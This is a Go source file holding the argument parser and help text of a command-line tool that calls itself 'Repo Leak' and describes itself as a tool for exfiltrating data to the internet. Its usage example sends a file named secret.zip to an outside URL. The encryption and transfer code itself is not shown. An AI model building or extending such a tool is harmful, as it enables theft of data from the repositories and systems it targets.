package modules

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
)

// Args holds the command line arguments
type Args struct {
	FilePath      string
	EncryptionKey string
	BaseURL       string
	Verbose       bool
}

// ParseArgs parses command line arguments and returns an Args struct
func ParseArgs() (Args, error) {
	var args Args
	var showHelp bool

	// Define flags
	flag.StringVar(&args.BaseURL, "u", "", "Base URL for the transfer")
	flag.StringVar(&args.BaseURL, "url", "", "Base URL for the transfer")

	flag.StringVar(&args.FilePath, "f", "", "Path to the file to encrypt and transfer")
	flag.StringVar(&args.FilePath, "file", "", "Path to the file to encrypt and transfer")

	flag.StringVar(&args.EncryptionKey, "k", "", "Encryption key")
	flag.StringVar(&args.EncryptionKey, "key", "", "Encryption key")

	flag.BoolVar(&args.Verbose, "v", false, "Verbose mode")
	flag.BoolVar(&args.Verbose, "verbose", false, "Verbose mode")

	flag.BoolVar(&showHelp, "h", false, "Show help")
	flag.BoolVar(&showHelp, "help", false, "Show help")

	// Parse the flags
	flag.Parse()

	// Show help if requested or no arguments provided
	if showHelp {
		printUsage()
		return args, fmt.Errorf("help requested")
	}

	// Validate arguments - all are required
	if args.BaseURL == "" {
		printUsage()
		return args, fmt.Errorf("base URL is required. Use -u or --url to specify")
	}

	if args.FilePath == "" {
		printUsage()
		return args, fmt.Errorf("file path is required. Use -f or --file to specify")
	}

	if args.EncryptionKey == "" {
		printUsage()
		return args, fmt.Errorf("encryption key is required. Use -k or --key to specify")
	}

	// Check if the file exists
	if _, err := os.Stat(args.FilePath); os.IsNotExist(err) {
		return args, fmt.Errorf("file not found: %s", args.FilePath)
	}

	return args, nil
}

// printUsage prints usage information
func printUsage() {
	executableName := filepath.Base(os.Args[0])

	// Professional ASCII art for "Repo Leak"
	fmt.Print(`
 ██████╗ ███████╗██████╗  ██████╗     ██╗     ███████╗ █████╗ ██╗  ██╗
 ██╔══██╗██╔════╝██╔══██╗██╔═══██╗    ██║     ██╔════╝██╔══██╗██║ ██╔╝
 ██████╔╝█████╗  ██████╔╝██║   ██║    ██║     █████╗  ███████║█████╔╝ 
 ██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║    ██║     ██╔══╝  ██╔══██║██╔═██╗ 
 ██║  ██║███████╗██║     ╚██████╔╝    ███████╗███████╗██║  ██║██║  ██╗
 ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
`)

	// Simple description
	fmt.Println("Simple tools for exfiltrating data to the internet.")
	fmt.Println()

	fmt.Printf("Usage: %s -u/--url <baseURL> -f/--file <filePath> -k/--key <encryptionKey> [-v/--verbose]\n\n", executableName)
	fmt.Println("Options:")
	fmt.Println("  -u, --url <baseURL>         Base URL for the transfer")
	fmt.Println("  -f, --file <filePath>       Path to the file to encrypt and transfer")
	fmt.Println("  -k, --key <encryptionKey>   Encryption key")
	fmt.Println("  -v, --verbose               Enable verbose output")
	fmt.Println("  -h, --help                  Show this help message")
	fmt.Println("\nExample:")
	fmt.Printf("  %s --url http://example.com --file ./secret.zip --key mySecretKey123\n", executableName)
}
